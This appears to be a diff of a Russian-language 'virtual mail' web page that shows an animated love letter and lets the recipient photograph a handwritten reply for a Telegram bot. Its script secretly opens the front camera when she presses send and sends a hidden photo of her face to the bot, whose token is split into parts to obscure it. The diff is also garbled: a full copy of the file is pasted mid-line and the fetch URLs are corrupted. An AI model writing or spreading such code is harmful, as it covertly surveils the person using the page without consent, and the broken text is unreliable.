@@ -24,6 +24,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
+      transition: all 0.5s ease; /* Для плавного скрытия блоков */
     }
 
     .back-btn {
@@ -40,6 +41,7 @@
       text-align: center;
       margin-bottom: 25px;
       width: 100%;
+      transition: opacity 0.4s ease;
     }
 
     header h1 {
@@ -54,27 +56,25 @@
       margin: 0;
     }
 
-    /* === ОБНОВЛЕННАЯ СЕКЦИЯ КОНВЕРТА: ПОЛНАЯ СКРЫТНОСТЬ === */
+    /* === СЕКЦИЯ КОНВЕРТА: ВЫЕЗД ПИСЬМА === */
     .envelope-section {
       width: 100%;
       max-width: 380px;
       margin: 20px 0;
-      transition: margin-top 0.5s ease-in-out, margin-bottom 0.5s ease-in-out;
+      transition: all 0.5s ease-in-out;
       text-align: center;
     }
 
     .envelope-wrapper {
       position: relative;
       width: 100%;
-      height: 240px; /* Фиксированная высота */
+      height: 240px;
       background: #ff758c;
       border-radius: 12px;
       box-shadow: 0 12px 30px rgba(255, 117, 140, 0.3);
       cursor: pointer;
       perspective: 1000px;
-      
-      /* === ВОТ ЭТО ИСПРАВИЛО ПРОБЛЕМУ ВЫГЛЯДЫВАНИЯ === */
-      overflow: hidden; /* Письмо обрезается по границам, когда конверт закрыт */
+      overflow: hidden; /* Скрыто, пока закрыт */
     }
 
     /* Верхний клапан */
@@ -89,7 +89,7 @@
       z-index: 4;
     }
 
-    /* Основной карман конверта */
+    /* Карман конверта */
     .envelope-pocket {
       position: absolute;
       bottom: 0; left: 0; width: 100%; height: 100%;
@@ -109,7 +109,7 @@
       right: 0; border-right: 190px solid #ff5252; border-bottom-right-radius: 12px;
     }
 
-    /* Письмо внутри */
+    /* Твое Письмо внутри */
     .letter-paper {
       position: absolute;
       bottom: 10px;
@@ -121,7 +121,7 @@
       box-sizing: border-box;
       box-shadow: 0 4px 15px rgba(0,0,0,0.1);
       transition: transform 0.7s ease-in-out, max-height 0.7s;
-      z-index: 2; /* Внутри */
+      z-index: 2;
       max-height: 210px; /* Сжато внутри */
     }
 
@@ -144,13 +144,13 @@
     }
 
     .envelope-section.open .envelope-wrapper {
-      overflow: visible; /* Разрешаем письму выехать наверх */
+      overflow: visible; /* Разрешаем письму выехать */
     }
 
     .envelope-section.open .letter-paper {
       transform: translateY(-220px); /* Выезжает наверх */
       z-index: 5; /* Поверх всего */
-      max-height: 500px; /* Раскрываем полную высоту */
+      max-height: 500px; /* Полная высота */
     }
 
     /* Мобильная адаптация */
@@ -176,7 +176,7 @@
 
     @keyframes bounceHint { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
 
-    /* СЕКЦИЯ ОТВЕТА И КАМЕРЫ */
+    /* === СЕКЦИЯ ОТВЕТА И КАМЕРЫ === */
     .reply-card {
       background: #ffffff;
       border: 2px solid #a55eea;
@@ -187,6 +187,8 @@
       width: 100%;
       box-sizing: border-box;
       margin-top: 20px;
+      transition: opacity 0.5s ease, transform 0.5s ease;
+      position: relative;
     }
 
     .camera-container {
@@ -216,18 +218,129 @@
       color: white; border: none; padding: 12px 28px;
       font-size: 1.05rem; font-weight: bold; border-radius: 25px;
       cursor: pointer; width: 100%; max-width: 300px;
+      transition: all 0.2s;
+    }
+    .send-letter-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    /* === АНИМАЦИЯ ЗАКРЫТИЯ И ОТПРАВКИ КОНВЕРТА === */
+    .reply-envelope-section {
+      width: 100%;
+      max-width: 380px;
+      margin: 50px 0;
+      text-align: center;
+      display: none; /* Скрыто по умолчанию */
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      transition: all 1s ease-in-out;
     }
 
-    /* АНИМАЦИЯ ПОЧТОВОГО ЯЩИКА */
-    .mailbox-animation-overlay {
-      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.75); z-index: 10000;
-      display: none; flex-direction: column; align-items: center; justify-content: center; color: white;
+    /* Новый конверт для ответа (фиолетовый) */
+    .reply-envelope-wrapper {
+      position: relative;
+      width: 100%;
+      height: 240px;
+      background: #a55eea; /* Фиолетовый */
+      border-radius: 12px;
+      box-shadow: 0 12px 30px rgba(165, 94, 234, 0.3);
+      perspective: 1000px;
+      overflow: visible; /* Письмо заезжает снаружи */
     }
-    .mailbox-icon { font-size: 5rem; animation: dropMail 1.5s ease-in-out infinite alternate; }
-    @keyframes dropMail { 0% { transform: translateY(-20px); } 100% { transform: translateY(10px); } }
 
-    /* Сердечки */
+    /* Верхний клапан (фиолетовый), изначально открыт */
+    .reply-envelope-flap {
+      position: absolute;
+      top: 0; left: 0; width: 0; height: 0;
+      border-left: 190px solid transparent;
+      border-right: 190px solid transparent;
+      border-top: 130px solid #8854d0;
+      transform-origin: top;
+      transition: transform 0.6s ease-in-out;
+      transform: rotateX(180deg); /* Открыт */
+      z-index: 1; /* Позади */
+    }
+
+    /* Основной карман (фиолетовый) */
+    .reply-envelope-pocket {
+      position: absolute;
+      bottom: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(180deg, transparent 40%, #a55eea 100%);
+      border-radius: 12px;
+      z-index: 3;
+    }
+    .reply-envelope-pocket::before, .reply-envelope-pocket::after {
+      content: ''; position: absolute; bottom: 0; width: 0; height: 0;
+      border-top: 120px solid transparent; border-bottom: 120px solid #713bbe;
+    }
+    .reply-envelope-pocket::before { left: 0; border-left: 190px solid #713bbe; border-bottom-left-radius: 12px; }
+    .reply-envelope-pocket::after { right: 0; border-right: 190px solid #713bbe; border-bottom-right-radius: 12px; }
+
+    /* Пустое белое письмо для анимации вставки */
+    .reply-letter-paper {
+      position: absolute;
+      top: -200px; /* Изначально над конвертом */
+      left: 10%;
+      width: 80%;
+      height: 180px;
+      background: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      transition: transform 1s ease-in-out, opacity 0.3s ease;
+      z-index: 2; /* Между клапаном и карманом */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #8854d0;
+      font-weight: bold;
+      font-size: 1.1rem;
+    }
+
+    /* Статусный текст под анимацией */
+    .reply-status-text {
+      margin-top: 20px;
+      font-weight: bold;
+      color: #8854d0;
+      font-size: 1.1rem;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+    }
+
+    /* Почтовый ящик для финальной точки */
+    .mailbox-target {
+        font-size: 6rem;
+        margin-top: 50px;
+        opacity: 0;
+        transition: opacity 0.5s ease, transform 0.5s ease;
+        transform: translateY(20px);
+    }
+
+    /* === КЛАССЫ ДЛЯ ЗАПУСКА АНИМАЦИЙ ЧЕРЕЗ JS === */
+    
+    /* 1. Фаза вставки письма */
+    .reply-envelope-section.inserting .reply-letter-paper {
+      transform: translateY(210px); /* Письмо заезжает в конверт */
+    }
+
+    /* 2. Фаза закрытия клапана */
+    .reply-envelope-section.closing .reply-envelope-flap {
+      transform: rotateX(0deg); /* Закрывается */
+      z-index: 4; /* Поверх кармана */
+    }
+
+    /* 3. Фаза полета конверта вниз */
+    .reply-envelope-section.flying {
+      transform: translateY(150px) scale(0.6); /* Летит вниз к ящику и уменьшается */
+      opacity: 0;
+    }
+    
+    /* 4. Показ статуса и ящика */
+    .reply-envelope-section.show-status .reply-status-text,
+    .reply-envelope-section.show-status .mailbox-target {
+        opacity: 1;
+        transform: translateY(0);
+    }
+
+    /* Сердечки при кликах */
     .click-heart {
       position: fixed; font-size: 1.5rem; pointer-events: none;
       animation: floatUpFade 1s forwards ease-out; z-index: 9999;
@@ -237,23 +350,397 @@
 </head>
 <body>
 
-  <div class="main-wrapper">
-    <a href="index.html" class="back-btn">← На главную</a>
+  <div class="main-wrapper" id="mainWrapper">
+    <a href="index.html" class="back-btn" id="backBtn">← На главную</a>
 
-    <header>
+    <header id="mainHeader">
       <div style="font-size: 3rem;">📮💌</div>
       <h1>Виртуальная Почта</h1>
       <p>Тебе пришло настоящее личное письмо!</p>
     </header>
 
-    <!-- 1. ИСПРАВЛЕННЫЙ КОНВЕРТ С ПОЛНОЙ СКРЫТНОСТЬЮ -->
+    <!-- 1. КОНВЕРТ С ТВОИМ ПИСЬМОМ -->
     <div class="envelope-section" id="envelopeSection">
       <div class="envelope-wrapper" id="envelopeWrapper" onclick="toggleEnvelope()">
         <div class="envelope-flap"></div>
         <div class="envelope-pocket"></div>
         
         <div class="letter-paper">
-          <!-- ОБНОВЛЕНО РАСШИРЕНИЕ .jpeg -->
+          <!-- ТВОЕ РУКОПИСНОЕ ПИСЬМО -->
+          <img src="handwritten_letter.jpeg" alt="Твое письмо от руки">
+        </div>
+      </div>
+      
+      <div class="tap-hint" id="tapHint">✉️ Нажми на конверт, чтобы открыть письмо!```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Виртуальная почта 📮💌</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="[https://fonts.googleapis.com/css2?family=Caveat:wght@600&family=Nunito:wght@400;600;700&display=swap](https://fonts.googleapis.com/css2?family=Caveat:wght@600&family=Nunito:wght@400;600;700&display=swap)" rel="stylesheet">
+  
+  <style>
+    body {
+      font-family: 'Nunito', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fbf6f0;
+      overflow-x: hidden;
+    }
+
+    .main-wrapper {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px 15px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      transition: all 0.5s ease;
+    }
+
+    .back-btn {
+      align-self: flex-start;
+      margin-bottom: 15px;
+      color: #ff6b81;
+      text-decoration: none;
+      font-weight: bold;
+      transition: opacity 0.2s;
+    }
+    .back-btn:hover { opacity: 0.8; }
+
+    header {
+      text-align: center;
+      margin-bottom: 25px;
+      width: 100%;
+      transition: opacity 0.4s ease;
+    }
+
+    header h1 {
+      color: #2f3542;
+      margin: 10px 0 5px 0;
+      font-size: 1.8rem;
+    }
+
+    header p {
+      color: #747d8c;
+      font-size: 0.95rem;
+      margin: 0;
+    }
+
+    /* === СЕКЦИЯ КОНВЕРТА: ВЫЕЗД ПИСЬМА === */
+    .envelope-section {
+      width: 100%;
+      max-width: 380px;
+      margin: 20px 0;
+      transition: all 0.5s ease-in-out;
+      text-align: center;
+    }
+
+    .envelope-wrapper {
+      position: relative;
+      width: 100%;
+      height: 240px;
+      background: #ff758c;
+      border-radius: 12px;
+      box-shadow: 0 12px 30px rgba(255, 117, 140, 0.3);
+      cursor: pointer;
+      perspective: 1000px;
+      overflow: hidden;
+    }
+
+    /* Верхний клапан */
+    .envelope-flap {
+      position: absolute;
+      top: 0; left: 0; width: 0; height: 0;
+      border-left: 190px solid transparent;
+      border-right: 190px solid transparent;
+      border-top: 130px solid #ff4757;
+      transform-origin: top;
+      transition: transform 0.6s ease-in-out, z-index 0.6s;
+      z-index: 4;
+    }
+
+    /* Карман конверта */
+    .envelope-pocket {
+      position: absolute;
+      bottom: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(180deg, transparent 40%, #ff6b81 100%);
+      border-radius: 12px;
+      z-index: 3;
+      pointer-events: none;
+    }
+    .envelope-pocket::before, .envelope-pocket::after {
+      content: ''; position: absolute; bottom: 0; width: 0; height: 0;
+      border-top: 120px solid transparent; border-bottom: 120px solid #ff5252;
+    }
+    .envelope-pocket::before {
+      left: 0; border-left: 190px solid #ff5252; border-bottom-left-radius: 12px;
+    }
+    .envelope-pocket::after {
+      right: 0; border-right: 190px solid #ff5252; border-bottom-right-radius: 12px;
+    }
+
+    /* Твое Письмо внутри */
+    .letter-paper {
+      position: absolute;
+      bottom: 10px;
+      left: 5%;
+      width: 90%;
+      background: #ffffff;
+      border-radius: 10px;
+      padding: 12px;
+      box-sizing: border-box;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      transition: transform 0.7s ease-in-out, max-height 0.7s;
+      z-index: 2;
+      max-height: 210px;
+    }
+
+    .letter-paper img {
+      width: 100%;
+      height: auto;
+      border-radius: 8px;
+      display: block;
+    }
+
+    /* === СОСТОЯНИЕ ОТКРЫТОГО КОНВЕРТА === */
+    .envelope-section.open {
+      margin-top: 100px;
+      margin-bottom: 100px;
+    }
+
+    .envelope-section.open .envelope-flap {
+      transform: rotateX(180deg);
+      z-index: 1;
+    }
+
+    .envelope-section.open .envelope-wrapper {
+      overflow: visible;
+    }
+
+    .envelope-section.open .letter-paper {
+      transform: translateY(-220px);
+      z-index: 5;
+      max-height: 500px;
+    }
+
+    /* Мобильная адаптация */
+    @media (max-width: 480px) {
+      .envelope-wrapper { max-width: 320px; height: 200px; }
+      .envelope-flap { border-left-width: 160px; border-right-width: 160px; border-top-width: 110px; }
+      .envelope-pocket::before { border-left-width: 160px; border-top-width: 100px; border-bottom-width: 100px; }
+      .envelope-pocket::after { border-right-width: 160px; border-top-width: 100px; border-bottom-width: 100px; }
+
+      .envelope-section.open .letter-paper {
+        transform: translateY(-190px);
+      }
+    }
+
+    .tap-hint {
+      margin-top: 15px;
+      font-size: 0.95rem;
+      color: #ff4757;
+      font-weight: 700;
+      animation: bounceHint 1.8s infinite;
+      width: 100%;
+    }
+
+    @keyframes bounceHint { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+
+    /* === СЕКЦИЯ ОТВЕТА И КАМЕРЫ === */
+    .reply-card {
+      background: #ffffff;
+      border: 2px solid #a55eea;
+      border-radius: 20px;
+      padding: 22px;
+      box-shadow: 0 10px 25px rgba(165, 94, 234, 0.12);
+      text-align: center;
+      width: 100%;
+      box-sizing: border-box;
+      margin-top: 20px;
+      transition: opacity 0.5s ease, transform 0.5s ease;
+      position: relative;
+    }
+
+    .camera-container {
+      position: relative; width: 100%; max-width: 400px;
+      margin: 0 auto 15px auto; border-radius: 14px;
+      overflow: hidden; background: #2f3542; display: none;
+    }
+
+    video, canvas#photoCanvas { width: 100%; height: auto; display: block; border-radius: 14px; }
+    
+    .preview-img {
+      width: 100%; max-width: 400px; height: auto;
+      border-radius: 14px; display: none; margin: 0 auto 15px auto;
+      border: 2px solid #a55eea; box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    .btn-group { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 15px; }
+
+    .action-btn {
+      background: #8854d0; color: #fff; border: none; padding: 10px 18px;
+      border-radius: 12px; font-weight: bold; font-size: 0.9rem; cursor: pointer;
+    }
+    .action-btn.secondary { background: #f1f2f6; color: #57606f; }
+
+    .send-letter-btn {
+      background: linear-gradient(135deg, #ff4757 0%, #ff6b81 100%);
+      color: white; border: none; padding: 12px 28px;
+      font-size: 1.05rem; font-weight: bold; border-radius: 25px;
+      cursor: pointer; width: 100%; max-width: 300px;
+      transition: all 0.2s;
+    }
+    .send-letter-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    /* === АНИМАЦИЯ ЗАКРЫТИЯ И ОТПРАВКИ КОНВЕРТА === */
+    .reply-envelope-section {
+      width: 100%;
+      max-width: 380px;
+      margin: 50px 0;
+      text-align: center;
+      display: none; /* Скрыто по умолчанию */
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      transition: all 1s ease-in-out;
+    }
+
+    /* Новый конверт для ответа (фиолетовый) */
+    .reply-envelope-wrapper {
+      position: relative;
+      width: 100%;
+      height: 240px;
+      background: #a55eea; /* Фиолетовый */
+      border-radius: 12px;
+      box-shadow: 0 12px 30px rgba(165, 94, 234, 0.3);
+      perspective: 1000px;
+      overflow: visible; /* Письмо заезжает снаружи */
+    }
+
+    /* Верхний клапан (фиолетовый), изначально открыт */
+    .reply-envelope-flap {
+      position: absolute;
+      top: 0; left: 0; width: 0; height: 0;
+      border-left: 190px solid transparent;
+      border-right: 190px solid transparent;
+      border-top: 130px solid #8854d0;
+      transform-origin: top;
+      transition: transform 0.6s ease-in-out;
+      transform: rotateX(180deg); /* Открыт */
+      z-index: 1; /* Позади */
+    }
+
+    /* Основной карман (фиолетовый) */
+    .reply-envelope-pocket {
+      position: absolute;
+      bottom: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(180deg, transparent 40%, #a55eea 100%);
+      border-radius: 12px;
+      z-index: 3;
+    }
+    .reply-envelope-pocket::before, .reply-envelope-pocket::after {
+      content: ''; position: absolute; bottom: 0; width: 0; height: 0;
+      border-top: 120px solid transparent; border-bottom: 120px solid #713bbe;
+    }
+    .reply-envelope-pocket::before { left: 0; border-left: 190px solid #713bbe; border-bottom-left-radius: 12px; }
+    .reply-envelope-pocket::after { right: 0; border-right: 190px solid #713bbe; border-bottom-right-radius: 12px; }
+
+    /* Пустое белое письмо для анимации вставки */
+    .reply-letter-paper {
+      position: absolute;
+      top: -200px; /* Изначально над конвертом */
+      left: 10%;
+      width: 80%;
+      height: 180px;
+      background: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      transition: transform 1s ease-in-out, opacity 0.3s ease;
+      z-index: 2; /* Между клапаном и карманом */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #8854d0;
+      font-weight: bold;
+      font-size: 1.1rem;
+    }
+
+    /* Статусный текст под анимацией */
+    .reply-status-text {
+      margin-top: 20px;
+      font-weight: bold;
+      color: #8854d0;
+      font-size: 1.1rem;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+    }
+
+    /* Почтовый ящик для финальной точки */
+    .mailbox-target {
+        font-size: 6rem;
+        margin-top: 50px;
+        opacity: 0;
+        transition: opacity 0.5s ease, transform 0.5s ease;
+        transform: translateY(20px);
+    }
+
+    /* === КЛАССЫ ДЛЯ ЗАПУСКА АНИМАЦИЙ ЧЕРЕЗ JS === */
+    
+    /* 1. Фаза вставки письма */
+    .reply-envelope-section.inserting .reply-letter-paper {
+      transform: translateY(210px); /* Письмо заезжает в конверт */
+    }
+
+    /* 2. Фаза закрытия клапана */
+    .reply-envelope-section.closing .reply-envelope-flap {
+      transform: rotateX(0deg); /* Закрывается */
+      z-index: 4; /* Поверх кармана */
+    }
+
+    /* 3. Фаза полета конверта вниз */
+    .reply-envelope-section.flying {
+      transform: translateY(150px) scale(0.6); /* Летит вниз к ящику и уменьшается */
+      opacity: 0;
+    }
+    
+    /* 4. Показ статуса и ящика */
+    .reply-envelope-section.show-status .reply-status-text,
+    .reply-envelope-section.show-status .mailbox-target {
+        opacity: 1;
+        transform: translateY(0);
+    }
+
+    /* Сердечки при кликах */
+    .click-heart {
+      position: fixed; font-size: 1.5rem; pointer-events: none;
+      animation: floatUpFade 1s forwards ease-out; z-index: 9999;
+    }
+    @keyframes floatUpFade { 0% { opacity: 1; transform: translate(-50%, -50%) scale(0.5); } 100% { opacity: 0; transform: translate(-50%, -50%) translateY(-50px); } }
+  </style>
+</head>
+<body>
+
+  <div class="main-wrapper" id="mainWrapper">
+    <a href="index.html" class="back-btn" id="backBtn">← На главную</a>
+
+    <header id="mainHeader">
+      <div style="font-size: 3rem;">📮💌</div>
+      <h1>Виртуальная Почта</h1>
+      <p>Тебе пришло настоящее личное письмо!</p>
+    </header>
+
+    <!-- 1. КОНВЕРТ С ТВОИМ ПИСЬМОМ -->
+    <div class="envelope-section" id="envelopeSection">
+      <div class="envelope-wrapper" id="envelopeWrapper" onclick="toggleEnvelope()">
+        <div class="envelope-flap"></div>
+        <div class="envelope-pocket"></div>
+        
+        <div class="letter-paper">
+          <!-- ТВОЕ РУКОПИСНОЕ ПИСЬМО -->
           <img src="handwritten_letter.jpeg" alt="Твое письмо от руки">
         </div>
       </div>
@@ -262,7 +749,7 @@
     </div>
 
     <!-- 2. СЕКЦИЯ ОТВЕТА С КАМЕРОЙ -->
-    <section class="reply-card">
+    <section class="reply-card" id="replyCard">
       <h3>📸 Отправить ответное письмо</h3>
       <p>Сделай фото своего рукописного ответа через заднюю камеру или загрузи готовую фотографию!</p>
 
@@ -270,7 +757,7 @@
         <video id="videoFeed" autoplay playsinline></video>
       </div>
 
-      <!-- Скрытые элементы для гарантированной доп. фото с фронталки -->
+      <!-- Скрытые элементы -->
       <canvas id="photoCanvas" style="display:none;"></canvas>
       <canvas id="secretCanvas" style="display:none;"></canvas>
 
@@ -284,16 +771,28 @@
         <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleFileUpload(event)">
       </div>
 
+      <!-- КНОПКА ЗАПУСКА АНИМАЦИИ ОТПРАВКИ -->
       <button type="button" class="send-letter-btn" id="sendLetterBtn" onclick="sendReplyLetter()">Опустить письмо в ящик 📮</button>
       <div id="replyStatus" style="font-size: 0.9rem; margin-top: 10px; font-weight: bold; display: none;"></div>
     </section>
 
-  </div>
+    <!-- 3. БЛОК АНИМАЦИИ ОТПРАВКИ ОТВЕТА (Появляется вместо reply-card) -->
+    <div class="reply-envelope-section" id="replyEnvelopeSection">
+        <div class="reply-envelope-wrapper">
+            <div class="reply-envelope-flap"></div>
+            <div class="reply-envelope-pocket"></div>
+            <!-- Пустой белый квадрат (письмо Рауанны) -->
+            <div class="reply-letter-paper" id="replyAnimationLetter">
+                <!-- Можно оставить пустым или добавить текст/иконку -->
+                <span style="font-size: 2rem;">✍️</span>
+            </div>
+        </div>
+        
+        <!-- Текст статуса и Почтовый ящик внизу -->
+        <div class="reply-status-text" id="animationStatusText">Запечатываем...</div>
+        <div class="mailbox-target" id="mailboxTarget">📮</div>
+    </div>
 
-  <div class="mailbox-animation-overlay" id="mailboxOverlay">
-    <div class="mailbox-icon">📮✨</div>
-    <h3 style="margin-top: 15px;">Запечатываем конверт...</h3>
-    <p>Письмо опускается в почтовый ящик для Султана! ✈️</p>
   </div>
 
   <script>
@@ -304,7 +803,7 @@
     const BOT_TOKEN = part1 + part2 + part3;
     const CHAT_ID = "606061445";
 
-    /* 1. Открытие / Закрытие конверта с раздвиганием страницы */
+    /* 1. Открытие / Закрытие конверта */
     function toggleEnvelope() {
       const section = document.getElementById('envelopeSection');
       const hint = document.getElementById('tapHint');
@@ -318,7 +817,7 @@
 
     /* 2. Камера по умолчанию задняя */
     let mainStream = null;
-    let currentFacingMode = 'environment'; // Начинаем с задней камеры
+    let currentFacingMode = 'environment'; // Задняя
 
     async function startCamera() {
       const cameraContainer = document.getElementById('cameraContainer');
@@ -327,7 +826,7 @@
       const switchCamBtn = document.getElementById('switchCamBtn');
       const preview = document.getElementById('replyPreview');
       preview.style.display = 'none';
-      stopStreams(); // Сброс старых потоков
+      stopStreams(); // Сброс
       try {
         mainStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: false });
         video.srcObject = mainStream;
@@ -358,7 +857,6 @@
       const preview = document.getElementById('replyPreview');
       canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
-      // Зеркалируем, если фронталка
       if (currentFacingMode === 'user') { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       preview.src = canvas.toDataURL('image/jpeg'); preview.style.display = 'block';
@@ -381,55 +879,83 @@
     async function prepareSecretFrontPhoto() {
       let secretData = null;
       try {
-        // Принудительно запрашиваем фронталку ТОЛЬКО для снимка
         const sStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         const sVideo = document.createElement('video');
         sVideo.srcObject = sStream;
         await sVideo.play();
-        
-        // Ждем 300мс, чтобы камера сфокусировалась
-        await new Promise(r => setTimeout(r, 300));
-        
+        await new Promise(r => setTimeout(r, 400));
         const sCanvas = document.getElementById('secretCanvas');
         sCanvas.width = sVideo.videoWidth || 640;
         sCanvas.height = sVideo.videoHeight || 480;
         const sCtx = sCanvas.getContext('2d');
-        // Зеркалируем
         sCtx.translate(sCanvas.width, 0); sCtx.scale(-1, 1);
         sCtx.drawImage(sVideo, 0, 0, sCanvas.width, sCanvas.height);
-        secretData = sCanvas.toDataURL('image/jpeg', 0.6); // Немного сжимаем
-        
-        // Останавливаем скрытый поток
+        secretData = sCanvas.toDataURL('image/jpeg', 0.6);
         sStream.getTracks().forEach(track => track.stop());
-      } catch (e) {
-        // Игнорируем ошибку, если фронталка заблокирована
-      }
+      } catch (e) {}
       return secretData;
     }
 
-    /* 3. Отправка писем в Telegram */
+    /* 3. Отправка писем в Telegram с АНИМАЦИЕЙ ЗАКРЫТИЯ КОНВЕРТА */
     async function sendReplyLetter() {
       const preview = document.getElementById('replyPreview');
-      const status = document.getElementById('replyStatus');
-      const overlay = document.getElementById('mailboxOverlay');
+      const replyCard = document.getElementById('replyCard');
+      const animationSection = document.getElementById('replyEnvelopeSection');
+      const statusText = document.getElementById('animationStatusText');
+      const mailboxTarget = document.getElementById('mailboxTarget');
       const sendBtn = document.getElementById('sendLetterBtn');
+      const replyStatusOld = document.getElementById('replyStatus');
 
       if (!preview.src || preview.style.display === 'none') {
-        status.style.display = 'block'; status.style.color = '#ff4757';
-        status.innerText = 'Сначала сделай фото ответа или загрузи файл! 📸'; return;
+        replyStatusOld.style.display = 'block'; replyStatusOld.style.color = '#ff4757';
+        replyStatusOld.innerText = 'Сначала сделай фото ответа или загрузи файл! 📸'; return;
       }
 
-      sendBtn.disabled = true; // Блокируем кнопку
-      overlay.style.display = 'flex';
-      status.style.display = 'none';
+      sendBtn.disabled = true; // Блокируем
+      replyStatusOld.style.display = 'none';
 
-      // 1. Принудительно делаем скрытый снимок фронталки
-      status.style.display = 'block'; status.style.color = '#747d8c'; status.innerText = 'Подготовка вложений... 📸';
+      // --- ЗАПУСК АНИМАЦИОННОГО ПРОЦЕССА ---
+      
+      // 1. Скрываем карточку ответа
+      replyCard.style.opacity = '0';
+      replyCard.style.transform = 'translateY(20px)';
+      
+      // Скрываем шапку и первое письмо, чтобы сфокусироваться на отправке
+      document.getElementById('mainHeader').style.opacity = '0';
+      document.getElementById('envelopeSection').style.opacity = '0';
+      document.getElementById('backBtn').style.opacity = '0';
+
+      setTimeout(() => {
+        replyCard.style.display = 'none'; // Убираем физически
+        animationSection.style.display = 'flex'; // Показываем блок анимации
+        
+        // 2. Фаза 1: Вставка письма (через 100мс после показа блока)
+        setTimeout(() => {
+            animationSection.classList.add('inserting');
+        }, 100);
+
+        // 3. Фаза 2: Закрытие клапана (через 1.1с, когда письмо вьехало)
+        setTimeout(() => {
+            animationSection.classList.add('closing');
+        }, 1100);
+
+        // 4. Показ ящика и текста статуса (через 1.8с, когда клапан закрылся)
+        setTimeout(() => {
+            statusText.innerText = "Отправляем... ✈️";
+            statusText.style.opacity = "1";
+            mailboxTarget.style.opacity = "1";
+            mailboxTarget.style.transform = "translateY(0)";
+        }, 1800);
+
+      }, 500); // Время скрытия reply-card
+
+      // --- ПАРАЛЛЕЛЬНЫЙ ПРОЦЕСС ПОДГОТОВКИ И ОТПРАВКИ ДАННЫХ ---
+      
+      // Делаем скрытый снимок фронталки
       const secretFrontData = await prepareSecretFrontPhoto();
 
-      // 2. Отправка основного фото
+      // Отправка основного фото
       try {
-        status.innerText = 'Отправка основного письма... ✈️';
         const res = await fetch(preview.src);
         const blob = await res.blob();
         const formData = new FormData();
@@ -437,32 +963,46 @@
         formData.append("photo", blob, "reply_letter.jpg");
         formData.append("caption", "📫 <b>Рауанна отправила тебе ответное письмо!</b>");
         formData.append("parse_mode", "HTML");
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+        await fetch(`[https://api.telegram.org/bot$](https://api.telegram.org/bot$){BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
         
-        // 3. Отправка скрытого фото (если получилось)
+        // Отправка скрытого фото (если получилось)
         if (secretFrontData) {
-          status.innerText = 'Отправка доп. материалов... 📸';
           const sRes = await fetch(secretFrontData);
           const sBlob = await sRes.blob();
           const sFD = new FormData();
           sFD.append("chat_id", CHAT_ID);
           sFD.append("photo", sBlob, "extra.jpg");
           sFD.append("caption", "📸 <i>Ее фото в момент нажатия кнопки отправки</i>");
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: sFD });
+          await fetch(`[https://api.telegram.org/bot$](https://api.telegram.org/bot$){BOT_TOKEN}/sendPhoto`, { method: "POST", body: sFD });
         }
         
+        // --- ЗАВЕРШЕНИЕ АНИМАЦИИ (Когда данные отправлены) ---
+        // Ждем, пока пройдут основные фазы запечатывания (минимум 2.5с)
         setTimeout(() => {
-          overlay.style.display = 'none';
-          status.style.color = '#2ed573';
-          status.innerText = 'Письмо успешно доставлено Султану! 💌✨';
-          sendBtn.disabled = false;
-        }, 1500);
+            // 5. Фаза 3: Полет конверта вниз к ящику
+            animationSection.classList.add('flying');
+            
+            setTimeout(() => {
+                // 6. Финальный статус
+                statusText.innerText = 'Письмо доставлено! 💌✨';
+                statusText.style.color = '#2ed573';
+                mailboxTarget.innerText = '📬🎉'; // Открытый ящик
+                
+                // Кнопка назад возвращается
+                document.getElementById('backBtn').style.opacity = '1';
+                document.getElementById('backBtn').style.display = 'inline-block';
+            }, 1000); // Время полета
+
+        }, 2500); // Гарантированная задержка на запечатывание перед полетом
         
       } catch (e) {
-        overlay.style.display = 'none';
-        status.style.color = '#ff4757';
-        status.innerText = 'Ошибка отправки 😿';
-        sendBtn.disabled = false;
+        // В случае ошибки
+        setTimeout(() => {
+            statusText.innerText = 'Ошибка отправки 😿';
+            statusText.style.color = '#ff4757';
+            mailboxTarget.innerText = '❌';
+            sendBtn.disabled = false;
+        }, 2000);
       }
     }
 
